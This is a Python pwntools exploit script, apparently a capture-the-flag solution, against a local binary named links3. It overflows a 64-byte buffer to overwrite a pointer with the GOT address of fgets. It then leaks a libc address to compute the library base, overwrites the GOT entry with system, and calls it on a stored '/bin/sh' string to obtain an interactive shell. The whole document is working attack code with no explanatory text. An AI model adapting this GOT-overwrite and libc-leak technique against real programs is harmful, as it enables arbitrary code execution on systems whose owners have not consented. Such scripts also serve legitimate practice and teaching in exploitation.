from pwn import *

def write_data(exploit,pos):
    r.sendlineafter('>>> ' ,"2")
    r.sendlineafter('>>> ' ,pos)
    r.sendlineafter('>>> ' ,exploit)

r = process("./links3")
e = ELF("./links3")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
write_data(b"/bin/sh","0")
write_data(b"pugal","1")
write_data(b"jo","2")
exploit = b"A" * 64 + p32(e.got.fgets)
write_data(exploit,"1")
r.sendlineafter('>>> ' ,"1")
r.recvuntil(b"0: /bin/sh\n1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8@@\n2: ")
libc_leak = r.recvuntil(b"\x7f")
libc_leak = libc_leak + b"\x00" * 2
libc_leak = u64(libc_leak)
log.info(f"[LEAK] {hex(libc_leak)}")
libc_base = libc_leak - libc.sym.fgets
log.info(f"[LEAK] {hex(libc_base)}")
write_data(p64(libc_base + libc.sym.system),"2")
r.sendlineafter('>>> ' ,"2")
r.sendlineafter('>>> ' ,"0")
r.interactive()
